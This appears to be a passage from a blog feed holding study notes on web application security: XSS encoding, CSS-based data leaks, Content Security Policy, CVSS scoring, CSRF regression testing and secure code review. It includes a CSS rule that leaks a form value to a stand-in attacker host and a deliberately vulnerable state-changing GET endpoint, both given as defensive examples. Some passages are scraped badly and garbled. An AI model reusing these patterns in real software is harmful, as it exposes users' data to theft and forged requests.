class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userLink = <span class="string">&quot;&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> goToLink = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> dummy = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"> dummy.href = userLink;</span><br><span class="line"> <span class="built_in">window</span>.location.href = <span class="string">`https://mywebsite.com/<span class="subst">$&#123;dummy.a&#125;</span>`</span>;</span><br><span class="line"> <span class="comment">// goes to: https://my-website.com/%3Cstrong%3Etest%3C/strong</span></span><br><span class="line">&#125;;</span><br><span class="line">goToLink();</span><br></pre></td></tr></table></figure><p>encodeURIComponent(‘<strong>test&lt;/strong’); // %3Cstrong%3Etest%3C%2Fstrong%3E</p><blockquote><p>Note that encodeURIComponent() cannot be used for an entire URL string as it will<br>no longer conform to the HTTP spec because scheme as the origin (scheme + :// +<br>hostname + : + port) cannot be interpreted by browsers when encoded (it becomes<br>a different origin).</p></blockquote><p>####HTML Entity Encoding<br>The “big five” for entity encoding are shown</p><table><thead><tr><th>Charcter</th><th>Entity encoded</th></tr></thead><tbody><tr><td>&amp;</td><td>&amp; + amp;</td></tr><tr><td>&lt;</td><td>&amp; + lt;</td></tr></tbody></table><blockquote><pre><code>      |   &amp; + gt;</code></pre><p>“           |   &amp; + #034;<br>‘           |   &amp; + #039;</p></blockquote><p>Entity encoding will NOT protect any content injected inside of a <script></script> tag, CSS, or a URL. It will only protect against content injected into a <div></div> or <div></div>-like DOM node. This is because it is possible to create a<br>string of HTML entity encoded strings in such an order that part of the string is still<br>valid JavaScript.<br>####CSS</p><p> Any time an image from another origin is<br>loaded into the page, a GET request is issued—be it from HTML, JS, or CSS.<br>In CSS we can use the background:url attribute to load an image from a provided<br>domain. Because this is an HTTP GET, it can also include query params.</p><p>CSS also allows for selective styling based on the condition of a form. This means we<br>can change the background of an element in the DOM based on the state of a form<br>field:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#income</span><span class="selector-attr">[value=<span class="string">&quot;&gt;100k&quot;</span>]</span> &#123;</span><br><span class="line"> <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;https://www.hacker.com/incomes?amount=gte100k&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As you can see, when the income button is set to &gt;100k, the CSS background changes,<br>initiating a GET request and leaking the form data to another website.</p><p>In conclusion, CSS attacks can be avoided by:<br>[easy]<br>Disallowing user-uploaded CSS<br>[medium]<br>Allowing only specific fields to be modified by the user and generating the<br>custom stylesheet yourself on the server using these fields<br>[hard]<br>Sanitizing any HTTP-initiating CSS attributes (background:url)</p><p>####Content Security Policy for XSS Prevention</p><blockquote><p>CSP protections come in several forms, including what external scripts can be loaded,<br>where they can be loaded, and what DOM APIs are allowed to execute the script.</p></blockquote><p>The “self” in the CSP declaration simply refers to the current URL from which the<br>policy is loaded and the protected document is being served. As such the CSP script<br>source is actually used for defining multiple URLs: safe URLs to load scripts from,<br>and the current URL.</p><p>CSP allows you to specifically whitelist URLs from which dynamic scripts can be<br>loaded. This is known as script-src in your CSP. A simple script-src looks like<br>this: Content-Security-Policy: script-src “self” <a href="https://api.megabank.com/">https://api.megabank.com</a>.<br>With such a CSP configuration, attempting to load a script from <a href="https://api2.megabank.com/">https://api2.megabank.com</a> would not be successful, and the browser would throw a CSP violation<br>error. This is very beneficial because it means scripts from unknown sources, like<br><a href="https://www.hacker.com/">https://www.hacker.com</a>, would not be able to load and execute on your site</p><p>One way to mitigate the risk of scripts you did not write executing inside of your<br>application is to reduce the number of allowed script sources.<br>####Unsafe Eval and Unsafe Inline<br>By default, inline script execution is disabled when CSP is enabled. This can be reenabled by adding unsafe-inline to your script-src definition.<br>Similarly, eval() and similar methods that provide string -&gt; code interpretation<br>are disabled by default when CSP is enabled. This can be disabled with the flag<br>unsafe-eval inside of your script-src definition.</p><p>If you are relying on eval or an eval-like function, it is often wise to try to rewrite<br>that function in a way that does not cause it to be interpreted as a string. For example:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> startCountDownTimer = <span class="function"><span class="keyword">function</span>(<span class="params">minutes, message</span>) </span>&#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="string">`window.alert(<span class="subst">$&#123;message&#125;</span>);`</span>, minutes * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>is written more safely as:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> startCountDownTimer = <span class="function"><span class="keyword">function</span>(<span class="params">minutes, message</span>) </span>&#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> alert(message);</span><br><span class="line">&#125;, minutes * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>While both are valid uses of setTimeout(), one is much more prone to XSS script<br>execution as the complexity of the function grows with the addition of new features.<br>Any function that is interpreted as a string risks potential escape, leading to code exe‐<br>cution. More specific functions with highly specific parameters reduce the risk of<br>unintended script execution.<br>####Implementing a CSP</p><p>CSP is easy to implement as it is simply a string configuration modifier that is read by<br>the browser and translated into security rules</p><p>P, but the most common are:</p><ul><li>Have your server send a content-Security-Policy header with each request.<br>The data in the header should be the security policy itself.</li><li>Embed a <meta> tag in your HTML markup. The meta tag should look like:<meta http-equiv="Content-Security-Policy" content="script-srchttps://www.mega-bank.com;">It is wise to enact CSP as a first step in XSS mitigation if you already know what typeof programming constructs and APIs your application will rely on. This means that ifyou know where you will consume code and how you will consume it, make sure to244 | Chapter 22: Defending Against XSS Attackswrite the correct CSP strings up and utilize them right when you start development.CSP can be easily changed at a later date.###Summarydifficulty is protecting your website against XSS usually comes when u have a feature requirement to display user-submitted infor as DOM rather than as text.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#Anti-XSS Coding Best Practices&lt;br&gt;**&lt;em&gt;Dont’ allow any user-supplied data to be passwd into the DOM-except as strings**&lt;/em&gt;&lt;/p&gt;
&lt;block</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnerability Management</title>
    <link href="http://example.com/2020/09/17/Vulnerability%20Management/"/>
    <id>http://example.com/2020/09/17/Vulnerability%20Management/</id>
    <published>2020-09-17T10:56:44.841Z</published>
    <updated>2020-09-20T01:38:57.386Z</updated>
    
    <content type="html"><![CDATA[<p>#secure software development life cycle (SSDL) </p><p>Reproducing Vulnerabilities<br>Ranking Vulnerability Severity、<br>Common Vulnerability Scoring System</p><p>The CVSS system is on version 3.1 at the time of this writing, which breaks down vul‐<br>nerability scoring into a few important subsections:</p><ul><li>Base—scoring the vulnerability itself</li><li>Temporal—scoring the severity of a vulnerability over time</li><li>Environmental—scoring a vulnerability based on the environment it exists in</li></ul><p>CVSS: Base Scoring<br>The CVSS v3.1 base scoring algorithm requires eight inputs (see Figure 21-2):</p><ul><li>Attack Vector (AV)</li><li>Attack Complexity (AC)</li><li>Privileges Required (PR)</li><li>User Interaction (UI)</li><li>Scope (S)</li><li>Confidentiality Impact (C)</li><li>Integrity Impact (I)</li><li>Availability Impact (A)</li></ul><p><strong><em>Attack Vector option</em></strong></p><blockquote><p>Attack Vector accepts Network, Adjacent, Local, and Physical options.<br>Each option describes the method by which an attacker can deliver the vulnera‐<br>bility payload. Network is the most severe, while physical is the least severe due<br>to increased difficulty of exploitation.</p></blockquote><p><strong><em>Attack Complexity option</em></strong></p><blockquote><p>Attack Complexity accepts two options, “low” or “high.” The Attack Complexity<br>input option refers to the difficulty of exploitation, which can be described as the<br>number of steps (recon, setup) required prior to delivering an exploit as well as<br>the number of variables outside of a hacker’s control.<br>An attack that could be repeated over and over again with no setup would be<br>“low,” while one that required a specific user to be logged in at a specific time and<br>on a specific page would be “high.”</p></blockquote><p><strong><em>Privileges Required option</em></strong></p><blockquote><p>Privileges Required describes the level of authorization a hacker needs to pull off<br>the attack: “none” (guest user), “low,” and “high.” A “high” privilege attack could<br>only be initiated by an admin, while “low” might refer to a normal user, and<br>“none” would be a guest.</p></blockquote><p><strong><em>User Interaction option</em></strong></p><blockquote><p>The User Interaction option has only two potential inputs, “none” and “required.”<br>This option details if user interaction (clicking a link) is required for the attack to<br>be successful.<br>Scope option<br>Scope suggests the range of impact successful exploitation would have.<br>“Unchanged” scope refers to an attack that can only affect a local system, such as<br>an attack against a database affecting that database. “Changed” scope refers to<br>attacks that can spread outside of the functionality where the attack payload is<br>delivered, such as an attack against a database that can affect the operating sys‐<br>tem or file system as well.</p></blockquote><p><strong><em>Condentiality option</em></strong></p><blockquote><p>Confidentiality takes one of three possible inputs: “none,” “low,” and “high.” Each<br>input suggests the type of data compromised based on its impact to the organiza‐<br>tion. The severity derived from confidentiality is likely based on your applica‐<br>tion’s business model, as some businesses (health care, for example) store much<br>more confidential data than others.</p></blockquote><p><strong><em>Integrity option</em></strong></p><blockquote><p>Integrity also takes one of three possible inputs: “none”, “low,” and “high.” The<br>“none” option refers to an attack that does not change application state, while<br>“low” changes some application state in limited scope, and “high” allows for the<br>changing of all or most application state. Application state is generally used when<br>referring to the data stored on a server, but could also be used in regard to local<br>client-side stores in a web application (local storage, session storage, indexedDB).</p></blockquote><p><strong><em>Availability option</em></strong></p><blockquote><p>Availability takes one of three possible options: “none,” “low,” and “high.” It refers<br>to the availability of the application to legitimate users. This option is important<br>for DoS attacks that interrupt or stop the application from being used by legiti‐<br>mate users, or code execution attacks that intercept intended functionality.</p></blockquote><blockquote><p>Entering each of these scores into the CVSS v3.1 algorithm will result in a number<br>between 0 and 10. This number is the severity score of the vulnerability, which can be<br>used for prioritizing resources and timelines for fixes. It can also help determine how<br>much risk your application is exposed to as a result of the vulnerability being<br>exploited.</p></blockquote><p>CVSS scores can be mapped to other vulnerability scoring frameworks that don’t use<br>numerical scoring quite easily:</p><ul><li>0.1–4: Low severity</li><li>4.1–6.9: Medium severity</li><li>7–8.9: High severity</li><li>9+: Critical severity<br>By using the CVSS v3.1 algorithm, or one of the many web-based CVSS calculators,<br>you can begin scoring your found vulnerabilities in order to aid your organization in<br>prioritizing and resolving risk in an effective manner.</li></ul><p>Summary<br>Vulnerability management is a combination of very important but particular tasks.<br>First, a vulnerability needs to be reproduced and documented by an engineer. This<br>allows an organization to be sure the report is valid, and also to understand if there is<br>deeper impact than originally reported. This process should also give insight into the<br>amount of effort required for resolving the vulnerability.<br>Next, a vulnerability should be scored based on some type of scoring system that<br>allows your organization to determine the risk that the vulnerability exposes your<br>application to. The scoring system used for this does not matter as much as its rele‐<br>vance to your business model and its ability to accurately predict the damage that<br>could be done to your application as a result of exploitation.<br>After properly reproducing and scoring a vulnerability (the “triage” step), a vulnera‐<br>bility must be resolved. Ideally, a vulnerability should be resolved with a proper fix<br>that spans the entire application surface area and is well tested to avoid edge cases.<br>When this is not possible, partial fixes should be deployed and additional bugs should<br>be filed detailing still-vulnerable surface area.<br>Finally, as each bug is resolved, a proper security regression test should be written so<br>that the bug cannot be accidentally reopened or reimplemented at a later date.<br>Successfully following these steps will dramatically reduce the risk your organization<br>is exposed to as vulnerabilities are found, and aid your organization in rapidly and<br>efficiently resolving vulnerabilities based on the potential damage they could have in<br>your organization.</p><blockquote><p>CVSS: Temporal Scoring<br>Temporal scoring in CVSS is simple, but due to complicated wording it can sound<br>daunting. Temporal scores show you how well equipped your organization is to deal<br>with a vulnerability, given the state of the vulnerability at the time of reporting (see<br>Figure 21-3).<br>Figure 21-3. The CSRF temporal score scores a vulnerability based on the maturity of<br>security mechanisms in your codebase<br>The temporal score has three categories:<br>Exploitability<br>Accepts a value from “unproven” to “high.” This metric attempts to determine if a<br>reported vulnerability is simply a theory or proof of concept (something that<br>would require iteration to turn into an actual usable vulnerability), or if the vul‐<br>nerability can be deployed and used as is (working vulnerability).<br>Remediation Level<br>The Remediation Level takes a value suggesting the level of mitigations available.<br>A reported vulnerability with a working, tested fix being delivered would be a<br>“O” for “Official Fix,” while a vulnerability with no known solution would be a<br>“U” for “Fix Unavailable.”<br>Report Condence<br>The Report Confidence metric helps determine the quality of the vulnerability<br>report. A theoretical report with no reproduction code or understanding of how<br>230 | Chapter 21: Vulnerability Management<br>to begin the reproduction process would appear as an “Unknown” confidence,<br>while a well-written report with a reproduction and description would be a<br>“Confirmed” report confidence.<br>The temporal score follows the same scoring range (0–10) but instead of measuring<br>the vulnerability itself, it measures the mitigations in place and the quality and relia‐<br>bility of the vulnerability report.<br>CVSS: Environmental Scoring<br>CVSS environmental scores detail your particular environment (specific to your<br>application) in order to understand what data or operations would present the most<br>risk to your organization if a hacker were to exploit them (see Figure 21-4).<br>Figure 21-4. The CVSS environmental score measures a vulnerability based on the con‐<br>text (environment) in which it would be exploited<br>The environmental scoring algorithm takes all of the base score inputs, but scores<br>them in addition to three requirements that detail the importance of confidentiality,<br>integrity, and availability to your application.<br>The three new fields are as follows:<br>Condentiality Requirement<br>The level of confidentiality your application requires. Freely available public<br>applications may score lower, while applications with strict contractual require‐<br>ments (health care, government) would score higher.<br>Integrity Requirement<br>The impact of application state being changed by a hacker in your organization.<br>An application that generates test sandboxes that are designed to be thrown away<br>would score lower than an application that stores crucial corporate tax records.<br>Availability Requirement<br>The impact on the application as a result of downtime. An application expected<br>to be live 24/7 would be impacted more than an application with no uptime<br>promises.<br>Common Vulnerability Scoring System | 231<br>The environmental score scores a vulnerability relative to your application’s require‐<br>ments, while the base score scores a vulnerability by itself in a vacuum</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#secure software development life cycle (SSDL) &lt;/p&gt;
&lt;p&gt;Reproducing Vulnerabilities&lt;br&gt;Ranking Vulnerability Severity、&lt;br&gt;Common Vulnerabi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2020/09/17/Vulnerability%20Discvoery/"/>
    <id>http://example.com/2020/09/17/Vulnerability%20Discvoery/</id>
    <published>2020-09-17T10:01:16.040Z</published>
    <updated>2020-09-17T10:54:30.379Z</updated>
    
    <content type="html"><![CDATA[<p>#Security Automation<br>most common security automation :</p><ul><li>Static analysis</li><li>Dynamic analysis</li><li>Vulnerability regression testing<br>Many robust and powerful static analysis tools exist, such as the following:</li><li>Checkmarx (most major languages—paid)</li><li>PMD (Java—free)</li><li>Bandit (Python—free)</li><li>Brakeman (Ruby—free)</li></ul><p>General XSS<br>    Look for DOM manipulation with innerHTML.<br>Reflected XSS<br>    Look for variables pulled from a URL param.</p><p>DOM XSS<br>    Look for specific DOM sinks like setInterval().<br>SQL Injection<br>    Look for user-provided strings being used in queries.<br>CSRF<br>    Look for state-changing GET requests.<br>DoS<br>    Look for improperly written regular expressions.</p><blockquote><p>Additionally, static analysis suffers when dealing with dynamic languages (like Java‐<br>Script). Statically typed languages like Java or C# are much easier to perform static<br>analysis on, as the tooling understands the expected data type, and that data cannot<br>change type as it traverses through functions and classes.<br>#Dynamic Analysis</p></blockquote><p>Dynamic analysis tools exist for many languages and frameworks. Some examples of<br>these are:</p><ul><li>IBM AppScan (paid)</li><li>Veracode (paid)</li><li>Iroh (free)<br>#Vulnerability Regression Testing<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> currentUser = <span class="built_in">require</span>(<span class="string">&#x27;../currentUser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> modifySubscription = <span class="built_in">require</span>(<span class="string">&#x27;../../modifySubscription&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> tiers = [<span class="string">&#x27;individual&#x27;</span>, <span class="string">&#x27;business&#x27;</span>, <span class="string">&#x27;corporation&#x27;</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Takes an HTTP GET on behalf of the currently authenticated user.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Takes a param `newTier` and attempts to update the authenticated</span></span><br><span class="line"><span class="comment"> * user&#x27;s subscription to that tier.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">app.get(<span class="string">&#x27;/changeSubscriptionTier&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!currentUser.isAuthenticated) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>); &#125;</span><br><span class="line"><span class="keyword">if</span> (!req.params.newTier) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>); &#125;</span><br><span class="line"><span class="keyword">if</span> (!tiers.includes(req.params.newTier)) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>); &#125;</span><br><span class="line">Security Automation | <span class="number">219</span></span><br><span class="line">modifySubscription(currentUser, req.params.newTier)</span><br><span class="line">.then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> res.sendStatus(<span class="number">200</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>make a request like GET /api/changeSubscriptionTier with any tier as the newTier<br>param and sends it via hyperlink to Steve. When Steve clicks this link, a request is<br>made on behalf of his account, changing the state of his subscription in his company’s<h1 id="application-portal"><a href="#application-portal" class="headerlink" title="application portal."></a>application portal.</h1>Jed has discovered a CSRF vulnerability in the application. Luckily, although Steve is<br>annoyed by Jed’s constant critiquing, he realizes the danger of this exploit and reports<br>it back to his organization for triaging. Once triaged, the solution is to switch the<br>request from an HTTP GET to an HTTP POST instead.</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> tester = <span class="built_in">require</span>(<span class="string">&#x27;tester&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> requester = <span class="built_in">require</span>(<span class="string">&#x27;requester&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Checks the HTTP Options of the `changeSubscriptionTier` endpoint.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Fails if more than one verb is accepted, or the verb is not equal</span></span><br><span class="line"><span class="comment"> * to &#x27;POST&#x27;.</span></span><br><span class="line"><span class="comment"> * Fails on timeout or unsuccessful options request.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> testTierChange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">requester.options(<span class="string">&#x27;http://app.com/api/changeSubscriptionTier&#x27;</span>)</span><br><span class="line"> .on(<span class="string">&#x27;response&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!res.headers) &#123;</span><br><span class="line"> <span class="keyword">return</span> tester.fail();</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">const</span> verbs = res.headers[<span class="string">&#x27;Allow&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line"> <span class="keyword">if</span> (verbs.length &gt; <span class="number">1</span>) &#123; <span class="keyword">return</span> tester.fail(); &#125;</span><br><span class="line"> <span class="keyword">if</span> (verbs[<span class="number">0</span>] !== <span class="string">&#x27;POST&#x27;</span>) &#123; <span class="keyword">return</span> tester.fail(); &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;)</span><br><span class="line"> .on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line"> <span class="built_in">console</span>.error(err);</span><br><span class="line"> <span class="keyword">return</span> tester.fail();</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In this case, the resolution to the<br>CSRF bug was that the endpoint should only accept HTTP POST requests. The regres‐<br>sion test ensures that the endpoint changeSubscriptionTier only takes a single<br>HTTP verb, and that verb is equal to POST. If a change in the future introduces a nonPOST version of that endpoint, or the fix is overwritten, then this test will fail, indi‐<br>cating that the vulnerability has regressed.<br>#Responsible Disclosure Programs</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#Security Automation&lt;br&gt;most common security automation :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Static analysis&lt;/li&gt;
&lt;li&gt;Dynamic analysis&lt;/li&gt;
&lt;li&gt;Vulnerability r</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2020/09/17/Reviewing%20Code%20for%20Security/"/>
    <id>http://example.com/2020/09/17/Reviewing%20Code%20for%20Security/</id>
    <published>2020-09-17T04:58:23.784Z</published>
    <updated>2020-09-17T09:58:52.865Z</updated>
    
    <content type="html"><![CDATA[<p>#Reviewing Code for Security<br>#How to start a Code Review</p><p>Here is a common local review flow that can be done from the terminal:</p><ol><li>Check out master with <strong><em>git checkout master.</em></strong></li><li>Fetch and merge the latest master with <strong><em>git pull origin master.</em></strong></li><li>Check out the feature branch with <strong><em>git checkout <username>/feature.</em></strong></li><li>Run a diff against the master with <strong><em>git diff origin/master…</em></strong></li></ol><p><strong><em>The git diff command should return two things:</em></strong></p><ul><li>A list of files that differ on master and the current branch</li><li>A list of changes in those files between master and the current branch</li></ul><p>#Archetypical Vulnerabilities Versus Custom Logic Bugs</p><blockquote><p><strong><em>A code security review checks for common vulnerabilities such as XSS, CSRF, injection, and so on, but more importantly checks for logic-level vulnerabilities that require deep context into the purpose of the code and cannot easily found by automated tools or scanners.</em></strong><br>This means we need to understand the users<br>of the feature, the functionality of the feature, and the business impact of the feature<br>#Where to Start a Security Review<br>Imagine a basic web application with two components: a client in the browser, and a<br>server that talks to that client.<br><strong><em>As a result, a good place to start in the actual source code is anywhere that a client (browser) makes a request to the server.</em></strong><br>Starting on the client is great because it will<br>begin to give you a good idea of the surface area you are dealing with. From there you<br>can learn what type of data is exchanged between the client and server, and if multiple<br>servers are being utilized rather than one. Furthermore, you can learn about the pay‐<br>loads being exchanged and how these payloads are being interpreted on the server.<br>After evaluating the client itself, you should follow the client’s API calls back to the<br>server. Begin evaluating calls that connect the client and the server in the web<br>application.<br>Once this is complete, you should probably consider tracing the helper methods,<br>dependencies, and functionality those APIs rely on. This means evaluating databases,<br>logs, uploaded files, conversion libraries, and anything else that the API endpoints<br>call directly or via a helper library.<br>Next, cover the bases by looking over every bit of functionality that could be exposed<br>to the client but isn’t directly called. This could be APIs built to support upcoming<br>functionality, or perhaps just functionality that was accidentally exposed and should<br>be internal.<br>Finally, after those major points in the codebase have been covered, dedicate your<br>time to the rest of the codebase. Determine the route taken via analysis of the busi‐<br>ness logic and prioritization based on the risks you envision such an application<br>encountering<br>To summarize, an effective way of determining what code to review in a security<br>review of a web application is as follows:</p></blockquote><ol><li>Evaluate the client-side code to gain understanding of the business logic and<br>understand what functionality users will be capable of using.</li><li>Using knowledge gained from the client review, begin evaluating the API layer, in<br>particular, the APIs you found via the client review. In doing this, you should be<br>able to get a good understanding of what dependencies the API layer relies on to<br>function.</li><li>Trace the dependencies in the API layer, carefully reviewing databases, helper<br>libraries, logging functions, etc. In doing this, you will get close to having covered<br>the majority of user-facing functionality.</li><li>Using the knowledge of the structure of the client-linked APIs, attempt to find<br>any public-facing APIs that may be unintentionally exposed or intended for<br>future feature releases. Review these as you find them.</li><li>Continue on throughout the remainder of the codebase. This should actually be<br>pretty easy because you will already be familiar with the codebase having read<br>through it in an organic method versus trying to brute force an understanding of<br>the application architecture<br>#Secure-Coding Anti-Patterns</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> blacklist = [<span class="string">&#x27;http://www.evil.com&#x27;</span>, <span class="string">&#x27;http://www.badguys.net&#x27;</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine if the domain is allowed for integration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> isDomainAccepted = <span class="function"><span class="keyword">function</span>(<span class="params">domain</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !blacklist.includes(domain);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> whitelist = [<span class="string">&#x27;https://happy-site.com&#x27;</span>, <span class="string">&#x27;https://www.my-friends.com&#x27;</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine if the domain is allowed for integration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> isDomainAccepted = <span class="function"><span class="keyword">function</span>(<span class="params">domain</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> whitelist.includes(domain);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>#Boilerplate Code]=default framework<br> avoid launching any boilerplate code into pro‐<br>duction environments unless that boilerplate code has been properly evaluated and<br>configured.&gt;|<br>#Trust-By-Default Anti-Pattern</p><p>#**Client/Server Separation</p><blockquote><p>the client and server application code are so tightly bound<br>that one cannot function without the other<br> PHP templating code with authentication logic, become much easier to<br>exploit due to lack of separation. Rather than reading the results of a network request,<br>a module sends back its HTML code, including any form data (for example, when<br>dealing with authentication). Then the server must be responsible for parsing that<br>HTML code and ensuring no script execution or parameter tampering occurs inside<br>both the HTML code and the authentication logic.<br><strong><em>In a totally separated client/server application, the server is not responsible for the<br>structure and content of the HTML data. Instead, the server rejects any HTML sent,<br>and only accepts authentication payloads using a predefined data transit format.</em></strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#Reviewing Code for Security&lt;br&gt;#How to start a Code Review&lt;/p&gt;
&lt;p&gt;Here is a common local review flow that can be done from the terminal:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2020/09/16/Secure%20Application%20Architecture/"/>
    <id>http://example.com/2020/09/16/Secure%20Application%20Architecture/</id>
    <published>2020-09-16T12:47:49.504Z</published>
    <updated>2020-09-17T04:52:21.123Z</updated>
    
    <content type="html"><![CDATA[<p>#Secure Application Architecture<br>**<em>The first step in securing any web application is the architecture phase.**</em></p><blockquote><p>When building a product, a cross-functional team of software engineers and product<br>managers usually collaborate to find a technical model that will serve a very specific<br>business goal in an efficient manner<br>#Analyzing Feature Requirements<br>collecting all of the business requirements that the product or feature is expected to implemen</p></blockquote><ul><li>Authentication and authorization: How do we handle sessions, logins, and cookies?</li><li>Personal data: Is it handled differently than other data? Do laws affect how weshould handle this data?</li><li>Search engine: How is the search engine implemented? Does it draw from the primary database as its single source of truth or use a separate cached database?<br>#Authentication and Authorization<ul><li>How do we handle data in transit?</li><li>How do we handle the storage of credentials?</li><li>How do we handle various authorization levels of users?<br>#Secure Sockets Layer and Transport Layer Security<blockquote><p>how to handle data in transit?<br>all data sent over the network is encrypted en route===reduces the risk of man-in-the-middle attack===steal credentials from users<br>Secure Sockets Layer(SSL) and Transport Layer Security(TLS)==msjot cryptographic protocols </p></blockquote></li></ul></li></ul><p><strong><em>TLS offers the most rigid security, while SSL has higher adoption<br>but multiple vulnerabilities that reduce its integrity as a cryptographic protocol.</em></strong><br>#Secure Credentials</p><blockquote><p><strong><em>Creating a secure password has less to do with the length and number of special aracters, but instead has everything to do with the terns that can be found in the password. In tography, this is known as entropy—the amount of ndomness and certainty. You want passwords with a lot of 